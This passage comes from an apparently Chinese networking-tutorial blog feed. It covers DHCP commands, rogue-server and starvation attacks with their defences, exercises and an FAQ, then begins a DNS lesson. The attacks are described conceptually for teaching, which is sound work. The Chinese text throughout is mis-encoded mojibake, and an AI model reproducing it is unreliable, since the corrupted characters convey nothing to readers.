Debian/Ubuntu</span><br><span class="hljs-built_in">cat</span> /var/lib/dhclient/dhclient.leases   <span class="hljs-comment"># CentOS/RHEL</span><br><br><span class="hljs-comment"># é‡Šæ”¾å’Œé‡æ–°è·å–ï¼ˆä½¿ç”¨dhclientï¼‰</span><br><span class="hljs-built_in">sudo</span> dhclient -r eth0  <span class="hljs-comment"># é‡Šæ”¾</span><br><span class="hljs-built_in">sudo</span> dhclient eth0     <span class="hljs-comment"># é‡æ–°è·å–</span><br><br><span class="hljs-comment"># æŸ¥çœ‹DHCPå®¢æˆ·ç«¯æ—¥å¿—</span><br>journalctl -u NetworkManager | grep -i dhcp<br></code></pre></td></tr></table></figure><p><strong>Mac</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æŸ¥çœ‹ç½‘ç»œé…ç½®</span><br>ifconfig<br><br><span class="hljs-comment"># é‡Šæ”¾DHCPç§Ÿçº¦</span><br><span class="hljs-built_in">sudo</span> ipconfig <span class="hljs-built_in">set</span> en0 DHCP<br><br><span class="hljs-comment"># æŸ¥çœ‹DHCPè¯¦ç»†ä¿¡æ¯</span><br>ipconfig getpacket en0<br></code></pre></td></tr></table></figure><h3 id="7-2-DHCPå®‰å…¨é—®é¢˜">7.2 DHCPå®‰å…¨é—®é¢˜</h3><p><strong>1. DHCPæ¬ºéª—æ”»å‡»</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">æ”»å‡»åœºæ™¯ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ 1. æ”»å‡»è€…éƒ¨ç½²å‡DHCPæœåŠ¡å™¨             â”‚<br>â”‚ 2. å®¢æˆ·ç«¯å‘é€ Discover                â”‚<br>â”‚ 3. å‡æœåŠ¡å™¨å¿«é€Ÿå“åº” Offer              â”‚<br>â”‚    - åˆ†é…æ­£å¸¸IP                       â”‚<br>â”‚    - ä½†ç½‘å…³æŒ‡å‘æ”»å‡»è€…                  â”‚<br>â”‚    - DNSæŒ‡å‘æ”»å‡»è€…                     â”‚<br>â”‚ 4. å®¢æˆ·ç«¯æµé‡è¢«åŠ«æŒ                   â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>é˜²æŠ¤æªæ–½ï¼š<br><span class="hljs-bullet">- </span>DHCP Snoopingï¼ˆäº¤æ¢æœºç‰¹æ€§ï¼‰<br><span class="hljs-bullet">- </span>ç«¯å£å®‰å…¨ï¼ˆåªå…è®¸ç‰¹å®šç«¯å£æ¥æ”¶DHCPå“åº”ï¼‰<br><span class="hljs-bullet">- </span>802.1Xè®¤è¯<br></code></pre></td></tr></table></figure><p><strong>2. DHCPé¥¿æ­»æ”»å‡»</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs markdown">æ”»å‡»åŸç†ï¼š<br><span class="hljs-bullet">1.</span> æ”»å‡»è€…ä¼ªé€ å¤§é‡ä¸åŒMACåœ°å€<br><span class="hljs-bullet">2.</span> å¿«é€Ÿè¯·æ±‚IPåœ°å€<br><span class="hljs-bullet">3.</span> è€—å°½DHCPåœ°å€æ± <br><span class="hljs-bullet">4.</span> æ­£å¸¸ç”¨æˆ·æ— æ³•è·å¾—IP<br><br>é˜²æŠ¤ï¼š<br><span class="hljs-bullet">-</span> é™åˆ¶ç«¯å£çš„MACåœ°å€æ•°é‡<br><span class="hljs-bullet">-</span> DHCPåœ°å€æ± è¶³å¤Ÿå¤§<br><span class="hljs-bullet">-</span> å¯ç”¨ç«¯å£å®‰å…¨<br></code></pre></td></tr></table></figure><p><strong>3. éæ³•DHCPæœåŠ¡å™¨</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">åœºæ™¯ï¼š<br><span class="hljs-bullet">- </span>å‘˜å·¥ç§è‡ªæ¥å…¥è·¯ç”±å™¨ï¼ˆå¯ç”¨DHCPï¼‰<br><span class="hljs-bullet">- </span>å¯¼è‡´ç½‘ç»œæ··ä¹±<br><br>æ£€æµ‹æ–¹æ³•ï¼š<br><span class="hljs-bullet">- </span>ç›‘æ§ç½‘ç»œä¸­çš„DHCPå“åº”<br><span class="hljs-bullet">- </span>ä½¿ç”¨DHCP Snooping<br><span class="hljs-bullet">- </span>å®šæœŸæ‰«æDHCPæœåŠ¡å™¨<br></code></pre></td></tr></table></figure><h3 id="7-3-DHCP-vs-é™æ€IP">7.3 DHCP vs é™æ€IP</h3><p><strong>å¯¹æ¯”è¡¨</strong>ï¼š</p><table><thead><tr><th>ç‰¹æ€§</th><th>DHCPï¼ˆåŠ¨æ€ï¼‰</th><th>é™æ€IP</th></tr></thead><tbody><tr><td><strong>é…ç½®æ–¹å¼</strong></td><td>è‡ªåŠ¨è·å–</td><td>æ‰‹åŠ¨é…ç½®</td></tr><tr><td><strong>æ˜“ç”¨æ€§</strong></td><td>âœ… ç®€å•ï¼Œå³æ’å³ç”¨</td><td>âŒ éœ€è¦æ‰‹åŠ¨é…ç½®</td></tr><tr><td><strong>ç®¡ç†æˆæœ¬</strong></td><td>âœ… ä½ï¼Œé›†ä¸­ç®¡ç†</td><td>âŒ é«˜ï¼Œé€å°é…ç½®</td></tr><tr><td><strong>IPå†²çª</strong></td><td>âœ… è‡ªåŠ¨é¿å…</td><td>âŒ å¯èƒ½å†²çª</td></tr><tr><td><strong>ç¨³å®šæ€§</strong></td><td>âš ï¸ ä¾èµ–DHCPæœåŠ¡å™¨</td><td>âœ… ä¸ä¾èµ–æœåŠ¡å™¨</td></tr><tr><td><strong>IPå›ºå®š</strong></td><td>âŒ å¯èƒ½å˜åŒ–</td><td>âœ… æ°¸ä¹…ä¸å˜</td></tr><tr><td><strong>é€‚ç”¨åœºæ™¯</strong></td><td>æ™®é€šå®¢æˆ·ç«¯ã€ç§»åŠ¨è®¾å¤‡</td><td>æœåŠ¡å™¨ã€ç½‘ç»œè®¾å¤‡</td></tr></tbody></table><p><strong>æ¨èç­–ç•¥</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ä½¿ç”¨é™æ€IPï¼š<br><span class="hljs-bullet">- </span>æœåŠ¡å™¨ï¼ˆWebã€DNSã€DHCPç­‰ï¼‰<br><span class="hljs-bullet">- </span>ç½‘ç»œè®¾å¤‡ï¼ˆè·¯ç”±å™¨ã€äº¤æ¢æœºï¼‰<br><span class="hljs-bullet">- </span>æ‰“å°æœºã€ç½‘ç»œæ‘„åƒå¤´<br><span class="hljs-bullet">- </span>éœ€è¦ç«¯å£æ˜ å°„çš„è®¾å¤‡<br><br>ä½¿ç”¨DHCPï¼š<br><span class="hljs-bullet">- </span>æ™®é€šåŠå…¬ç”µè„‘<br><span class="hljs-bullet">- </span>ç¬”è®°æœ¬ç”µè„‘<br><span class="hljs-bullet">- </span>ç§»åŠ¨è®¾å¤‡ï¼ˆæ‰‹æœºã€å¹³æ¿ï¼‰<br><span class="hljs-bullet">- </span>è®¿å®¢è®¾å¤‡<br><br>æ··åˆæ–¹æ¡ˆï¼š<br><span class="hljs-bullet">- </span>DHCP + ä¿ç•™åœ°å€ï¼ˆæ ¹æ®MACåˆ†é…å›ºå®šIPï¼‰<br><span class="hljs-code">  ä¼˜ç‚¹ï¼šæ—¢è‡ªåŠ¨é…ç½®ï¼ŒåˆIPå›ºå®š</span><br></code></pre></td></tr></table></figure><hr><h2 id="8-ä»Šæ—¥ç»ƒä¹ ">8. ä»Šæ—¥ç»ƒä¹ </h2><h3 id="ç»ƒä¹ 1ï¼šæŸ¥çœ‹æœ¬æœºDHCPä¿¡æ¯">ç»ƒä¹ 1ï¼šæŸ¥çœ‹æœ¬æœºDHCPä¿¡æ¯</h3><p>åœ¨ä½ çš„ç”µè„‘ä¸ŠæŸ¥çœ‹ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> å½“å‰IPåœ°å€<br><span class="hljs-bullet">2.</span> DHCPæœåŠ¡å™¨åœ°å€<br><span class="hljs-bullet">3.</span> ç§Ÿçº¦å¼€å§‹æ—¶é—´<br><span class="hljs-bullet">4.</span> ç§Ÿçº¦ç»“æŸæ—¶é—´<br><span class="hljs-bullet">5.</span> DNSæœåŠ¡å™¨åœ°å€<br><span class="hljs-bullet">6.</span> é»˜è®¤ç½‘å…³åœ°å€<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 2ï¼šé‡Šæ”¾å’Œé‡æ–°è·å–IP">ç»ƒä¹ 2ï¼šé‡Šæ”¾å’Œé‡æ–°è·å–IP</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown">æ­¥éª¤ï¼š<br><span class="hljs-bullet">1.</span> è®°å½•å½“å‰IPåœ°å€<br><span class="hljs-bullet">2.</span> é‡Šæ”¾IPåœ°å€ï¼ˆipconfig /releaseï¼‰<br><span class="hljs-bullet">3.</span> è§‚å¯Ÿç½‘ç»œçŠ¶æ€ï¼ˆæ— æ³•ä¸Šç½‘ï¼‰<br><span class="hljs-bullet">4.</span> é‡æ–°è·å–IPï¼ˆipconfig /renewï¼‰<br><span class="hljs-bullet">5.</span> å¯¹æ¯”å‰åIPæ˜¯å¦ç›¸åŒ<br><span class="hljs-bullet">6.</span> åˆ†æä¸ºä»€ä¹ˆç›¸åŒ/ä¸åŒ<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 3ï¼šè®¡ç®—ç§Ÿçº¦æ—¶é—´">ç»ƒä¹ 3ï¼šè®¡ç®—ç§Ÿçº¦æ—¶é—´</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å·²çŸ¥ï¼š<br><span class="hljs-bullet">-</span> ç§Ÿçº¦å¼€å§‹ï¼š2024-01-15 14:00:00<br><span class="hljs-bullet">-</span> ç§Ÿçº¦æ—¶é•¿ï¼š48å°æ—¶<br><br>è®¡ç®—ï¼š<br><span class="hljs-bullet">1.</span> T1ï¼ˆç»­çº¦æ—¶é—´ï¼‰<br><span class="hljs-bullet">2.</span> T2ï¼ˆé‡ç»‘æ—¶é—´ï¼‰<br><span class="hljs-bullet">3.</span> ç§Ÿçº¦åˆ°æœŸæ—¶é—´<br><span class="hljs-bullet">4.</span> ä»å¼€å§‹åˆ°T1çš„é—´éš”ï¼ˆç§’ï¼‰<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 4ï¼šDHCPæŠ“åŒ…åˆ†æ">ç»ƒä¹ 4ï¼šDHCPæŠ“åŒ…åˆ†æ</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ä½¿ç”¨WiresharkæŠ“åŒ…ï¼š<br><span class="hljs-bullet">1.</span> é‡Šæ”¾å½“å‰IP<br><span class="hljs-bullet">2.</span> å¯åŠ¨Wiresharkï¼Œè¿‡æ»¤ &quot;dhcp&quot;<br><span class="hljs-bullet">3.</span> é‡æ–°è·å–IP<br><span class="hljs-bullet">4.</span> è§‚å¯ŸDORAå››ä¸ªæŠ¥æ–‡<br><span class="hljs-bullet">5.</span> åˆ†ææ¯ä¸ªæŠ¥æ–‡çš„å†…å®¹<br></code></pre></td></tr></table></figure><hr><h2 id="9-å¸¸è§é—®é¢˜">9. å¸¸è§é—®é¢˜</h2><p><strong>Q1ï¼šä¸ºä»€ä¹ˆDHCP Requestè¦å¹¿æ’­è€Œä¸æ˜¯å•æ’­ï¼Ÿ</strong></p><p>Aï¼šä¸¤ä¸ªåŸå› ï¼š</p><ol><li>å‘Šè¯‰æ‰€æœ‰DHCPæœåŠ¡å™¨&quot;æˆ‘é€‰æ‹©äº†å“ªä¸ªoffer&quot;ï¼Œå…¶ä»–æœåŠ¡å™¨å¯ä»¥å›æ”¶IP</li><li>æ­¤æ—¶å®¢æˆ·ç«¯è¿˜æ²¡æœ‰æ­£å¼çš„IPï¼Œä½¿ç”¨å•æ’­å¯èƒ½æœ‰é—®é¢˜</li></ol><p><strong>Q2ï¼šå¦‚æœæœ‰å¤šä¸ªDHCPæœåŠ¡å™¨ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>å®¢æˆ·ç«¯ä¼šæ”¶åˆ°å¤šä¸ªOffer</li><li>å®¢æˆ·ç«¯é€šå¸¸é€‰æ‹©ç¬¬ä¸€ä¸ªæ”¶åˆ°çš„Offer</li><li>å…¶ä»–æœåŠ¡å™¨çœ‹åˆ°Requeståï¼Œä¼šå›æ”¶å®ƒä»¬æä¾›çš„IP</li></ul><p><strong>Q3ï¼šDHCPèƒ½è·¨ç½‘æ®µå·¥ä½œå—ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>ç›´æ¥ä¸èƒ½ï¼ˆå¹¿æ’­æ— æ³•è·¨è¶Šè·¯ç”±å™¨ï¼‰</li><li>éœ€è¦é…ç½®DHCP Relayï¼ˆä¸­ç»§ä»£ç†ï¼‰</li><li>è·¯ç”±å™¨å°†å¹¿æ’­è½¬æ¢ä¸ºå•æ’­è½¬å‘</li></ul><p><strong>Q4ï¼šç§Ÿçº¦åˆ°æœŸåæ²¡æœ‰ç»­çº¦ä¼šæ€æ ·ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>IPåœ°å€è¢«é‡Šæ”¾</li><li>å®¢æˆ·ç«¯å¤±å»ç½‘ç»œè¿æ¥</li><li>éœ€è¦é‡æ–°å‘èµ·DORAè·å–æ–°IP</li><li>é€šå¸¸å®¢æˆ·ç«¯ä¼šåœ¨åˆ°æœŸå‰è‡ªåŠ¨ç»­çº¦</li></ul><p><strong>Q5ï¼šä¸ºä»€ä¹ˆæœ‰æ—¶å€™IPåœ°å€ä¼šå˜åŒ–ï¼Ÿ</strong></p><p>Aï¼šå¯èƒ½åŸå› ï¼š</p><ul><li>ç§Ÿçº¦åˆ°æœŸåè·å¾—ä¸åŒçš„IP</li><li>DHCPæœåŠ¡å™¨é‡å¯ï¼Œåœ°å€æ± é‡ç½®</li><li>é•¿æ—¶é—´ç¦»çº¿ï¼ŒåŸIPè¢«åˆ†é…ç»™å…¶ä»–è®¾å¤‡</li><li>æ›´æ¢äº†ç½‘ç»œï¼ˆè¿æ¥ä¸åŒçš„WiFiï¼‰</li></ul><hr><h2 id="10-æ€»ç»“">10. æ€»ç»“</h2><p>ä»Šå¤©æˆ‘ä»¬å­¦ä¹ äº†ï¼š</p><h3 id="æ ¸å¿ƒçŸ¥è¯†ç‚¹">æ ¸å¿ƒçŸ¥è¯†ç‚¹</h3><ol><li><p><strong>DHCPåŸºç¡€</strong>ï¼š</p><ul><li>åŠ¨æ€ä¸»æœºé…ç½®åè®®</li><li>è‡ªåŠ¨åˆ†é…IPå’Œç½‘ç»œå‚æ•°</li><li>ç®€åŒ–ç½‘ç»œç®¡ç†</li></ul></li><li><p><strong>DORAè¿‡ç¨‹</strong>ï¼š</p><ul><li>Discoverï¼šå¯»æ‰¾DHCPæœåŠ¡å™¨</li><li>Offerï¼šæœåŠ¡å™¨æä¾›IP</li><li>Requestï¼šå®¢æˆ·ç«¯è¯·æ±‚IP</li><li>Ackï¼šæœåŠ¡å™¨ç¡®è®¤åˆ†é…</li></ul></li><li><p><strong>ç§Ÿçº¦ç®¡ç†</strong>ï¼š</p><ul><li>ç§Ÿçº¦ç”Ÿå‘½å‘¨æœŸ</li><li>T1ç»­çº¦ï¼ˆ50%ï¼‰ã€T2é‡ç»‘ï¼ˆ87.5%ï¼‰</li><li>ç§Ÿçº¦åˆ°æœŸå¤„ç†</li></ul></li><li><p><strong>DHCPæŠ¥æ–‡</strong>ï¼š</p><ul><li>åŸºäºBOOTPåè®®</li><li>UDPç«¯å£67/68</li><li>ä¸°å¯Œçš„Optionså­—æ®µ</li></ul></li><li><p><strong>é«˜çº§ç‰¹æ€§</strong>ï¼š</p><ul><li>DHCPä¸­ç»§ï¼ˆè·¨ç½‘æ®µï¼‰</li><li>å®‰å…¨é—®é¢˜ï¼ˆæ¬ºéª—ã€é¥¿æ­»æ”»å‡»ï¼‰</li><li>åœ°å€ä¿ç•™</li></ul></li></ol><h3 id="é‡ç‚¹å›é¡¾">é‡ç‚¹å›é¡¾</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">DHCP</span> <span class="hljs-operator">=</span> è‡ªåŠ¨ç½‘ç»œé…ç½®<br>è¿‡ç¨‹ <span class="hljs-operator">=</span> DORAï¼ˆ<span class="hljs-number">4</span>æ¬¡æ¡æ‰‹ï¼‰<br>ç®¡ç† <span class="hljs-operator">=</span> ç§Ÿçº¦æœºåˆ¶<br>å®‰å…¨ <span class="hljs-operator">=</span> DHCP Snooping<br><br>å¥½å¤„ï¼š<br>âœ… è‡ªåŠ¨åŒ–é…ç½®<br>âœ… é¿å…IPå†²çª<br>âœ… é›†ä¸­ç®¡ç†<br>âœ… æé«˜æ•ˆç‡<br></code></pre></td></tr></table></figure><h3 id="æ˜å¤©é¢„å‘Š">æ˜å¤©é¢„å‘Š</h3><p><strong>ç¬¬14å¤©ï¼šç¬¬äºŒå‘¨æ€»ç»“ä¸å®æˆ˜</strong></p><p>å†…å®¹é¢„è§ˆï¼š</p><ul><li>æœ¬å‘¨çŸ¥è¯†ä¸²è®²ï¼ˆDay 8-13ï¼‰</li><li>IPã€å­ç½‘ã€MACã€ç«¯å£ã€DNSã€DHCPç»¼åˆåº”ç”¨</li><li>ç»¼åˆé¡¹ç›®ï¼šç½‘ç»œé…ç½®åŠ©æ‰‹</li><li>çŸ¥è¯†æµ‹éªŒ</li></ul><hr><p><strong>ç»§ç»­åŠ æ²¹ï¼ğŸš€</strong></p><p>ä»Šå¤©æˆ‘ä»¬æ·±å…¥å­¦ä¹ äº†DHCPåè®®ï¼Œç†è§£äº†ç½‘ç»œè®¾å¤‡å¦‚ä½•è‡ªåŠ¨è·å–IPåœ°å€å’Œé…ç½®ã€‚DHCPæå¤§åœ°ç®€åŒ–äº†ç½‘ç»œç®¡ç†ï¼Œæ˜¯ç°ä»£ç½‘ç»œä¸å¯æˆ–ç¼ºçš„åŸºç¡€æœåŠ¡ã€‚æŒæ¡DHCPä¸ä»…èƒ½å¸®ä½ ç†è§£ç½‘ç»œè‡ªåŠ¨åŒ–é…ç½®ï¼Œè¿˜èƒ½åœ¨æ’æŸ¥ç½‘ç»œé—®é¢˜æ—¶å¿«é€Ÿå®šä½ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>12å¤©ï¼šDNSåè®®è¯¦è§£</title>
    <link href="/2025/11/10/12%E5%A4%A9%EF%BC%9ADNS%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/"/>
    <url>/2025/11/10/12%E5%A4%A9%EF%BC%9ADNS%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1>ç¬¬12å¤©ï¼šDNSåè®®è¯¦è§£</h1><h2 id="ä»Šæ—¥ç›®æ ‡">ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£DNSçš„å·¥ä½œåŸç†å’Œæ¶æ„</li><li>æŒæ¡DNSæŸ¥è¯¢è¿‡ç¨‹</li><li>äº†è§£å¸¸è§çš„DNSè®°å½•ç±»å‹</li><li>å­¦ä¼šä½¿ç”¨Pythonå®ç°DNSæŸ¥è¯¢å·¥å…·</li></ul><hr><h2 id="1-ä»€ä¹ˆæ˜¯DNSï¼Ÿ">1. ä»€ä¹ˆæ˜¯DNSï¼Ÿ</h2><h3 id="1-1-DNSçš„å®šä¹‰">1.1 DNSçš„å®šä¹‰</h3><p><strong>DNSï¼ˆDomain Name Systemï¼ŒåŸŸåç³»ç»Ÿï¼‰</strong> æ˜¯äº’è”ç½‘çš„&quot;ç”µè¯ç°¿&quot;ã€‚</p><p><strong>ç”Ÿæ´»ç±»æ¯”</strong>ï¼š</p><ul><li>ä½ è®°å¾—æœ‹å‹çš„åå­—ï¼Œä½†ä¸è®°å¾—ä»–çš„ç”µè¯å·ç </li><li>ä½ æŸ¥é€šè®¯å½•ï¼Œé€šè¿‡åå­—æ‰¾åˆ°ç”µè¯å·ç </li><li>DNSå°±æ˜¯è¿™æ ·ä¸€ä¸ªé€šè®¯å½•ï¼ŒæŠŠåŸŸåç¿»è¯‘æˆIPåœ°å€</li></ul><p><strong>ä¸ºä»€ä¹ˆéœ€è¦DNSï¼Ÿ</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">äººç±»å–œæ¬¢è®°å¿†ï¼šwww<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span><br>è®¡ç®—æœºéœ€è¦ä½¿ç”¨ï¼š<span class="hljs-number">110.242</span>.<span class="hljs-number">68.66</span><br><br>DNSçš„ä½œç”¨ï¼šæŠŠåŸŸåè½¬æ¢ä¸ºIPåœ°å€<br></code></pre></td></tr></table></figure><h3 id="1-2-DNSçš„é‡è¦æ€§">1.2 DNSçš„é‡è¦æ€§</h3><p><strong>å¦‚æœæ²¡æœ‰DNSä¼šæ€æ ·ï¼Ÿ</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">è®¿é—®ç™¾åº¦ï¼šhttp:<span class="hljs-comment">//110.242.68.66  âŒ å¾ˆéš¾è®°</span><br>è®¿é—®æ·˜å®ï¼šhttp:<span class="hljs-comment">//106.11.248.146 âŒ æ›´éš¾è®°</span><br>è®¿é—®å¾®ä¿¡ï¼šhttp:<span class="hljs-comment">//101.32.118.25  âŒ è®°ä¸ä½</span><br><br>æœ‰äº†DNSï¼š<br>è®¿é—®ç™¾åº¦ï¼šwww<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>  âœ… å®¹æ˜“è®°<br>è®¿é—®æ·˜å®ï¼šwww<span class="hljs-selector-class">.taobao</span><span class="hljs-selector-class">.com</span> âœ… å¥½è®°<br>è®¿é—®å¾®ä¿¡ï¼šwww<span class="hljs-selector-class">.weixin</span><span class="hljs-selector-class">.com</span> âœ… ç®€å•<br></code></pre></td></tr></table></figure><hr><h2 id="2-DNSæ¶æ„ä½“ç³»">2. DNSæ¶æ„ä½“ç³»</h2><h3 id="2-1-DNSå±‚çº§ç»“æ„">2.1 DNSå±‚çº§ç»“æ„</h3><p>DNSé‡‡ç”¨<strong>åˆ†å¸ƒå¼ã€å±‚çº§åŒ–</strong>çš„è®¾è®¡ï¼Œå°±åƒä¸€ä¸ªå€’ç½®çš„æ ‘å½¢ç»“æ„ï¼š</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                       .ï¼ˆæ ¹åŸŸï¼‰<br>                        |<span class="hljs-string"></span><br><span class="hljs-string">       +----------------+----------------+</span><br><span class="hljs-string">       </span>|<span class="hljs-string">                </span>|<span class="hljs-string">                </span>|<br>     com              cn               org<br>       |<span class="hljs-string">                </span>|<span class="hljs-string">                </span>|<br>  +----+----+      +----+----+      +----+----+<br>  |<span class="hljs-string">         </span>|<span class="hljs-string">      </span>|<span class="hljs-string">         </span>|<span class="hljs-string">      </span>|<span class="hljs-string">         </span>|<br>baidu    google  sina     163    wikipedia  linux<br>  |<span class="hljs-string">         </span>|<span class="hljs-string">      </span>|<span class="hljs-string">         </span>|<span class="hljs-string">        </span>|<span class="hljs-string">        </span>|<br> www       www    www       www      www      www<br></code></pre></td></tr></table></figure><p><strong>åŸŸåå±‚çº§ï¼ˆä»å³åˆ°å·¦ï¼‰</strong>ï¼š</p><ol><li><p><strong>æ ¹åŸŸï¼ˆRoot Domainï¼‰</strong>ï¼š<code>.</code></p><ul><li>æœ€é¡¶å±‚ï¼Œé€šå¸¸è¢«çœç•¥</li><li>å…¨çƒåªæœ‰13ç»„æ ¹åŸŸåæœåŠ¡å™¨</li></ul></li><li><p><strong>é¡¶çº§åŸŸï¼ˆTLD - Top Level Domainï¼‰</strong>ï¼š</p><ul><li>é€šç”¨é¡¶çº§åŸŸï¼š<code>.com</code> <code>.net</code> <code>.org</code> <code>.edu</code> <code>.gov</code></li><li>å›½å®¶é¡¶çº§åŸŸï¼š<code>.cn</code> <code>.us</code> <code>.uk</code> <code>.jp</code></li><li>æ–°é¡¶çº§åŸŸï¼š<code>.tech</code> <code>.xyz</code> <code>.top</code></li></ul></li><li><p><strong>äºŒçº§åŸŸï¼ˆSLD - Second Level Domainï¼‰</strong>ï¼š</p><ul><li><code>baidu.com</code> ä¸­çš„ <code>baidu</code></li><li><code>google.com</code> ä¸­çš„ <code>google</code></li></ul></li><li><p><strong>ä¸‰çº§åŸŸï¼ˆå­åŸŸï¼‰</strong>ï¼š</p><ul><li><code>www.baidu.com</code> ä¸­çš„ <code>www</code></li><li><code>mail.google.com</code> ä¸­çš„ <code>mail</code></li></ul></li></ol><p><strong>å®Œæ•´åŸŸåç¤ºä¾‹</strong>ï¼š</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">www.baidu.com.<br> |<span class="hljs-string">   </span>|<span class="hljs-string">     </span>|<span class="hljs-string">  </span>|<br> |<span class="hljs-string">   </span>|<span class="hljs-string">     </span>|<span class="hljs-string">  +-- æ ¹åŸŸï¼ˆé€šå¸¸çœç•¥ï¼‰</span><br><span class="hljs-string"> </span>|<span class="hljs-string">   </span>|<span class="hljs-string">     +----- é¡¶çº§åŸŸ</span><br><span class="hljs-string"> </span>|<span class="hljs-string">   +----------- äºŒçº§åŸŸ</span><br><span class="hljs-string"> +--------------- ä¸‰çº§åŸŸï¼ˆå­åŸŸï¼‰</span><br></code></pre></td></tr></table></figure><h3 id="2-2-DNSæœåŠ¡å™¨ç±»å‹">2.2 DNSæœåŠ¡å™¨ç±»å‹</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 